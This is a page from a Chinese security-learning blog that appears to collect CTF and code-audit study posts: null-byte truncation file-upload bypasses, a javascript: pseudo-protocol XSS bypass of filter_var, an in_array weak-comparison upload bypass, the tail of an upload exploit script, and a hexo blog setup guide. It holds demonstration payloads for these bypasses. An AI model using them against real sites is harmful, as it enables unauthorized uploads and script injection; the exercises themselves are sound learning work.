            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload

print &apos;[+]---result---&apos; + result_dir
</code></pre><p>演示结果:<br><img src="http://static.zybuluo.com/chhyx/fnkdqbqsk1vcsjthfzetp6de/17af9eea-fc2c-422d-ab34-7abd43bbadca.png" alt="17af9eea-fc2c-422d-ab34-7abd43bbadca.png-73.3kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/08/00截断的那些事儿/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/08/00截断的那些事儿/" itemprop="url">00截断的那些事儿</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-08T01:51:41+08:00">
                2018-09-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>今天在看法师的《代码审计》的文件操作时,多次提到00截断,自己不是很明白原理,所以查了查资料总结分享一波。</p>
</blockquote>
<hr>
<p>##<strong>0x00截断</strong><br>0x00是ascii码值为0的字符(也就是null),有些函数处理时 会把这个当作结束符而起到截断的作用,而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。</p>
<p>实验吧的一道题目:<br><a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">web-文件上传</a><br>经测试,题目是把dir的值与filename拼接来得到文件具体路径,而且题目要求我们上传后缀为php的文件,我们利用0x00具体操作:<br><img src="http://static.zybuluo.com/chhyx/vkncrlg1mqbt76aihgo06lcn/image_1cmqegtqjq1j1qoa7b4ed15ti5n.png" alt="image_1cmqegtqjq1j1qoa7b4ed15ti5n.png-29.4kB"><br><img src="http://static.zybuluo.com/chhyx/bosc6ugmftvb5kuymo1iyt2w/image_1cmqei3ro107jblq4r6hlffk864.png" alt="image_1cmqei3ro107jblq4r6hlffk864.png-66.4kB"><br>将25改为00即可截断成功<br>原理就是利用ascii码为零这个特殊字符,让系统认为字符串已经结束</p>
<p>##<strong>%00截断</strong><br>我们本地建文件测试:<br><img src="http://static.zybuluo.com/chhyx/f5grc6w6qw7xkssvsik3ow8u/image_1cmqais5n160uoj1bg31nkfcdv9.png" alt="image_1cmqais5n160uoj1bg31nkfcdv9.png-33.1kB"><br>分析要求可知:经get传入a的值 经ereg验证 必须是数字 但是经过strpos匹配又必须含有#biubiu 那这里也需要0x00截断 直接看操作:<br><img src="http://static.zybuluo.com/chhyx/9oix7wim5mao59ouby687w5p/image_1cmqarhckic71dbm15qrork17br1p.png" alt="image_1cmqarhckic71dbm15qrork17br1p.png-35.9kB"><br>这里还需要知道的是 #属于url特殊字符的一种 </p>
<blockquote>
<p><strong>url的特殊字符:</strong><br>1、空格换成加号(+)<br>2、正斜杠(/)分隔目录和子目录<br>3、问号(?)分隔URL和查询<br>4、百分号(%)制定特殊字符<br>5、#号指定书签<br>6、&amp;号分隔参数</p>
</blockquote>
<p>如果需要在URL中用到这些字符,需要将其换成相应的十六进制的值</p>
<blockquote>
<p>+ —- %2B<br>  / —-  %2F<br>  ?  —-     %3F<br>  % —-      %25<br> # —-     %23<br>  &amp; —-      %26</p>
</blockquote>
<p>我们改下payload:</p>
<pre><code>demo.php?a=1%00%23biubiu
</code></pre><p><img src="http://static.zybuluo.com/chhyx/gzbnhiooiwq4njw0pythtchy/image_1cmqb761uggj1k2hb912jd13t626.png" alt="image_1cmqb761uggj1k2hb912jd13t626.png-35.4kB"></p>
<p>成功执行<br>我们知道url发送到服务器后就被服务器解码,这时候并未传送到验证函数 就是说验证函数接收到的是%00解码后的内容,我们来看一下<br><img src="http://static.zybuluo.com/chhyx/9h146khh9wsjhvphbeanyqn4/image_1cmqbfj6hakc1e5k1prp19s1prm2j.png" alt="image_1cmqbfj6hakc1e5k1prp19s1prm2j.png-24kB"><br>我们猜测上图左面的小方块是解码后的0x00 我们来验证一下</p>
<p>没效果(%00未解码前):<br><img src="http://static.zybuluo.com/chhyx/pxzk57b121dy69equr06lzff/image_1cmqbt7387561hiq1nkcp97nfr3g.png" alt="image_1cmqbt7387561hiq1nkcp97nfr3g.png-34.9kB"></p>
<p>成功的(%00解码后):<br><img src="http://static.zybuluo.com/chhyx/derjryeijdajnojj3gzrvsjk/image_1cmqc6bco4hkldhf8g1d3i31m4t.png" alt="image_1cmqc6bco4hkldhf8g1d3i31m4t.png-57kB"><br>我们用<a href="https://mh-nexus.de/en/downloads.php?product=HxD" target="_blank" rel="noopener">HxD</a>将此处的25(%)变为00<br><img src="http://static.zybuluo.com/chhyx/eso9q6ojl663gb7svdne2i40/image_1cmqccn561t1b1gb5g7v8pl1c575a.png" alt="image_1cmqccn561t1b1gb5g7v8pl1c575a.png-9kB"><br>成功绕过 说明%00是被服务器解码为0x00发挥了截断作用</p>
<p>所以,%00又被称为url的终止符。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/06/代码审计之Day2 - filter_var函数缺陷/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/06/代码审计之Day2 - filter_var函数缺陷/" itemprop="url">代码审计之Day2 - filter_var函数缺陷</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-06T10:15:41+08:00">
                2018-09-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近看红日公众号的文章,看到 <strong>PHP-Audit-Labs</strong> 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波</p>
</blockquote>
<hr>
<p><strong>Day 2 - Twig</strong><br>题目名字:Twig<br><img src="http://static.zybuluo.com/chhyx/36d1fhnqk45hoxmjz55p0rya/image_1cmn8bi0j13r79fvd85to7p05p.png" alt="image_1cmn8bi0j13r79fvd85to7p05p.png-211.8kB"></p>
<p><strong>代码大意</strong>:php脚本接收GET传输过来的\$nextSlide参数,然后经过\filter_var()函数过滤处理之后赋值给\$link,然后$link这个参数经过escape过滤器处理 最后渲染index.html</p>
<p><strong>漏洞产生</strong>:这里考察的是xss漏洞,导致这一漏洞产生的原因是题中代码使用的escape过滤器跟filter_car()函数两个过滤方法并不安全,导致攻击者可构造js语句 造成xss(跨站脚本攻击)漏洞</p>
<p><strong>漏洞解析</strong>: escape过滤器(本质是htmlspecialchars函数)与filter_var()过滤函数的缺陷:并不能捕捉到jacascript伪协议构造的xss语句</p>
<p>题目中使用了<a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a>定义的escape过滤器跟filter_car()函数两个过滤方法，下面我们先讲一下这两种过滤的规则是怎样的</p>
<p>1.<a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener"><strong>escape</strong></a><br>在默认情况下 escape使用html转义策略</p>
<blockquote>
<p>在内部，escape使用PHP本机htmlspecialchars函数进行HTML转义策略。</p>
</blockquote>
<p>我们接着看下<strong>htmlspecialchars()</strong>函数</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener">htmlspecialchars()</a><br>(PHP 4, PHP 5, PHP 7)<br><strong>作用:</strong> 将特殊字符转换为 HTML 实体<br><strong>定义:</strong> string htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(“default_charset”) [, bool $double_encode = TRUE ]]] )</p>
</blockquote>
<p>转义前后字符:<br><img src="http://static.zybuluo.com/chhyx/7gmkdgry3l238wu19n9jti2s/image_1cmndbk64bioafv1kih1lm8uhq16.png" alt="image_1cmndbk64bioafv1kih1lm8uhq16.png-8.5kB"></p>
<p>2.<a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>filter_var()</strong></a><br>这里使用<strong>filter_var</strong>函数来过滤<strong>\$nextSlide</strong>变量 且用了<a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>FILTER_VALIDATE_URL</strong></a>过滤器来判断是否一个合法的url。</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>filter_var()</strong></a><br>(PHP 5 &gt;= 5.2.0, PHP 7)<br><strong>作用:</strong> 使用特定的过滤器过滤一个变量</p>
<p><strong>定义:</strong> mixed filter_var ( mixed \$variable [, int \$filter = FILTER_DEFAULT [, mixed \$options ]] )</p>
</blockquote>
<p>针对这两处的过滤,我们可以使用javascript://伪协议来绕过:</p>
<pre><code>javascript://P0rZ9%250aalert(1);
</code></pre><p>我们来本地测试一下：<br><img src="http://static.zybuluo.com/chhyx/7rjo70x4enrxtfm0su3w0fbh/image_1cmnjdbvppef19no1akip5acj7m.png" alt="image_1cmnjdbvppef19no1akip5acj7m.png-27.6kB"><br><img src="http://static.zybuluo.com/chhyx/6tmfahno1m39g0k806q0wtlj/image_1cmnkgim5qjv1hh0hbqr7e1tb013.png" alt="image_1cmnkgim5qjv1hh0hbqr7e1tb013.png-63.6kB"></p>
<p>成功执行alert(1)<br>代码实际意思:</p>
<pre><code>//         表示单行注释 注释掉后面的P0rZ9
%250a      %0a(换行符)经过url编码
alert(1);  执行的js代码
</code></pre><p><img src="http://static.zybuluo.com/chhyx/cxbyhnaq15qc2li0wa8rl95i/image_1cmnku1271fjr1bii1jggoa2lbr4t.png" alt="image_1cmnku1271fjr1bii1jggoa2lbr4t.png-8.2kB"></p>
<p>所以php脚本程序在接到浏览器传输过来的<strong>payload:</strong> <code>javascript://P0rZ9%250aalert(1);</code> 会先解码成 <code>javascript://P0rZ9%0aalert(1);</code> 然后赋值给\$url,我们点击a标签的链接就会触发alert()函数。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/06/代码审计之Day1 - in_array函数缺陷/" itemprop="url">代码审计之Day1 - in_array函数缺陷</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-06T08:15:41+08:00">
                2018-09-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近看红日公众号的文章,看到 <strong>PHP-Audit-Labs</strong> 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波</p>
</blockquote>
<hr>
<p><strong>Day 1 - Wish List</strong><br>题目名字:愿望清单<br><img src="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png" alt="image_1cmmmhtm01cn4nastlume1tso20.png-148.8kB"><br><strong>代码大意</strong>:检查文件名file[‘name’]是否在白名单$whitelist里–&gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIRECTORY</p>
<p><strong>漏洞产生</strong>:这里考察的是任意文件上传漏洞,导致这一漏洞产生的原因是弱类型比较和in_array()的不规范使用,攻击者可通过构造的文件名(1.php)来绕过服务端的检测,造成文件上传漏洞<br><strong>漏洞解析</strong>:因为未将in_array()函数的第三个参数设置为TRUE且目标数组$whitelist的元素类型为数字类型,所以在进行in_array()判断时1.php会强制转化为1,而1在rand(1,24)数组中,最终绕过in_array()判断。</p>
<blockquote>
<p><strong>in_array()</strong><br>作用:检查数组中是否存在某个值<br>定义:bool in_array ( mixed \$needle , array \$haystack [, bool \$strict = FALSE ] )</p>
</blockquote>
<blockquote>
<p>在\$haystack数组中搜索\$needle,如果\$strict参数的值为True,则in_array()函数会进行强检查(检查值、类型是否相同),如果没有设置,则默认为FALSE 进行弱检查(只检查值是否相同)。如果成功搜索到\$needle,则返回TRUE 否则返回FALSE。</p>
</blockquote>
<p><strong>本地测试:</strong><br><img src="http://static.zybuluo.com/chhyx/pquwjj86ytjbyba2dkr0ppvv/image_1cmmo17sncmevnor4a10hp1rm73d.png" alt="image_1cmmo17sncmevnor4a10hp1rm73d.png-35.3kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/05/用hexo+girhub部署博客/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/05/用hexo+girhub部署博客/" itemprop="url">用hexo+github部署博客</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-05T10:15:41+08:00">
                2018-09-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
</blockquote>
<hr>
<p> 不多说，先上图:<br><img src="http://static.zybuluo.com/chhyx/a0dhagjvyliwehbr6ems59ab/image_1cmkl94jtni51q3n1jbuhk6agt51.png" alt="image_1cmkl94jtni51q3n1jbuhk6agt51.png-1345.8kB"></p>
<p> <strong>一. 准备部分：</strong><br>   1.下载安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a><br><img src="http://static.zybuluo.com/chhyx/315m63hcb115ks6k69ibg56k/image_1cmklc598a3c1upgo1c18021bdu6e.png" alt="image_1cmklc598a3c1upgo1c18021bdu6e.png-20.5kB"><br>直接默认下一步安装即可,待安装完成后,在cmd运行：</p>
<p>   node -v</p>
<p>若显示版本信息 则表明成功安装<br><img src="http://static.zybuluo.com/chhyx/veiud9feuetbol2fec8o14yh/image_1cmklf8dmcdfecn5kdjje1jbn6r.png" alt="image_1cmklf8dmcdfecn5kdjje1jbn6r.png-7.1kB"></p>
<p>   2.下载安装<a href="https://git-scm.com/download" target="_blank" rel="noopener">Git</a><br>   <img src="http://static.zybuluo.com/chhyx/nkidyyw6phdtmyfxx6s2kvin/image_1cmkloj4jb0m76j86b1897e1l78.png" alt="image_1cmkloj4jb0m76j86b1897e1l78.png-28.2kB"><br>   直接默认安装即可,待安装完成后,在cmd运行：</p>
<pre><code>git --version
</code></pre><p>若显示版本信息 则表明成功安装<br>   <img src="http://static.zybuluo.com/chhyx/eofysd32sln0qvj99dvtzodp/image_1cmklr6mv6j593qlgt1u3u16227l.png" alt="image_1cmklr6mv6j593qlgt1u3u16227l.png-8.9kB"></p>
<p> <strong>二. Git部分</strong></p>
<p>1.首先注册一个github账号:<br><img src="http://static.zybuluo.com/chhyx/yxjc7ye3qpswxl4vslcktnmw/image_1cmkpnalum071qnj1h8e1ol1vpsga.png" alt="image_1cmkjubqc9aq1kb011vkn3i2j32g.png-91kB"></p>
<p>然后用新注册的邮箱登陆<br>2.点击NEW repository:<br><img src="http://static.zybuluo.com/chhyx/hqnms4ri266j82lbkebz6p1n/image_1cmkkj8qvqge1ehi48n1l8rflq3a.png" alt="image_1cmkkj8qvqge1ehi48n1l8rflq3a.png-39.3kB"></p>
<p>3.填写repository name:<br><img src="http://static.zybuluo.com/chhyx/8pnjy0pgo1sjsekom35h5z52/image_1cmkkgpudh85rlvabt81espd2t.png" alt="image_1cmkkgpudh85rlvabt81espd2t.png-67.9kB"></p>
<p>4.然后在新建的P0rZ9.github.io里,找到setting<br><img src="http://static.zybuluo.com/chhyx/camlvc1fxk5hwh6piz8l0l5v/image_1cmkkqohi929195m151e1cs21lkv3n.png" alt="image_1cmkkqohi929195m151e1cs21lkv3n.png-47.6kB"></p>
<p>5.在下面的page里选择一个样式:<br><img src="http://static.zybuluo.com/chhyx/2ultb5xv1m8ig5r09dz3osk3/image_1cmkktvug1711h2l2v8183s9ns4k.png" alt="image_1cmkktvug1711h2l2v8183s9ns4k.png-37.2kB"><br><img src="http://static.zybuluo.com/chhyx/4qnpecna39l5et99fdusqkoq/image_1cmkq1up5kj86op14b9vo01eg1gn.png" alt="image_1cmkq1up5kj86op14b9vo01eg1gn.png-110.5kB"><br>然后保存即可<br>6.浏览器访问<a href="https://P0rZ9.github.io" target="_blank" rel="noopener">https://P0rZ9.github.io</a>, 可以正常访问就说明我们的Git部分已经成功完成</p>
<p> <strong>三.Hexo部分</strong><br>1.安装hexo：<br>创建一个用于存放hexo组件的目录，我这里创建一个blogs目录为例，进入创建好的blogs目录，右键选择Git Bash Here<br>在新打开的Git窗口输入命令:</p>
<pre><code>npm install -g hexo-cli
</code></pre><p>2.新建一个网站:<br>安装hexo完成后,在文件夹内(blogs)执行命令:</p>
<pre><code>hexo init
</code></pre><p>hexo将会在指定的文件夹内新建所需要的文件，文件目录如下:<br><img src="http://static.zybuluo.com/chhyx/89ttxauk6impiqbrt5i0o744/image_1cmkmv4m41ot4apo85hvfiknqbf.png" alt="image_1cmkmv4m41ot4apo85hvfiknqbf.png-30.4kB"></p>
<p>3.生成静态页面:</p>
<pre><code>hexo g
</code></pre><p><img src="http://static.zybuluo.com/chhyx/xe5jwau68h3t2zpbu6ig25vt/image_1cmkn32581q2012kf1oqn17rv1hsadc.png" alt="image_1cmkn32581q2012kf1oqn17rv1hsadc.png-39.7kB"></p>
<p>4.启动本地服务器:</p>
<pre><code>hexo s
</code></pre><p><img src="http://static.zybuluo.com/chhyx/o4b6ncisb1pvzhoh2w0bw2r5/image_1cmkn6ba514cn3beai7eul0dp.png" alt="image_1cmkn6ba514cn3beai7eul0dp.png-9.4kB"></p>
<p>5.然后浏览器访问:  <em><a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></em> 即可看到我们的博客首页<br><img src="http://static.zybuluo.com/chhyx/f9j8ade5ne4md4ccl62l1m5l/image_1cmkn93j7ouk1o9c1p2t4im18u8e6.png" alt="image_1cmkn93j7ouk1o9c1p2t4im18u8e6.png-407.2kB"></p>
<p>当然这只是本地查看博客文章的效果 接下来我们要部署到github page上去</p>
<p> <strong>四.部署到github</strong><br>1.安装 hexo-deployer-git</p>
<pre><code>npm install hexo-deployer-git --save
</code></pre><p>2.修改_config.yml文件：<br> 将</p>
<pre><code>deploy:
  type:
</code></pre><p>修改为(将这里的P0rZ9更换为你自己的username):</p>
<pre><code>deploy:
  type: git 
  repo: https://github.com/P0rZ9/P0rZ9.github.io.git 
  branch: master
</code></pre><p>这里需要注意每个冒号后面需要空一格才能填写</p>
<p>3.部署:<br>运行命令:<br>    hexo g &amp;&amp; hexo d<br>然后根据提示填写github的账号密码<br><img src="http://static.zybuluo.com/chhyx/lumkhwwyb0sugnxlkzat4qdc/image_1cmkp13il1b7rs231fj0skg1jhvft.png" alt="image_1cmkp13il1b7rs231fj0skg1jhvft.png-81.4kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/x2fn4z632fj7r1apt9khryrk/image_1cmkoj5n61mls165h1158o50q9uej.png" alt="image_1cmkoj5n61mls165h1158o50q9uej.png-25.1kB"></p>
<p>然后访问<a href="https://p0rz9.github.io/" target="_blank" rel="noopener">https://p0rz9.github.io/</a><br><img src="http://static.zybuluo.com/chhyx/gdf0d96y6v3e6jkegzancb0g/image_1cmkoq4cj1nf01s1c1fivjqj1v09fg.png" alt="image_1cmkoq4cj1nf01s1c1fivjqj1v09fg.png-397.9kB"><br>成功搭建。</p>
<p> <strong>五. 参考资料</strong><br><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo中文指南</a><br><a href="https://www.jianshu.com/p/9df4aba9c25a" target="_blank" rel="noopener">hexo+github搭建blog</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
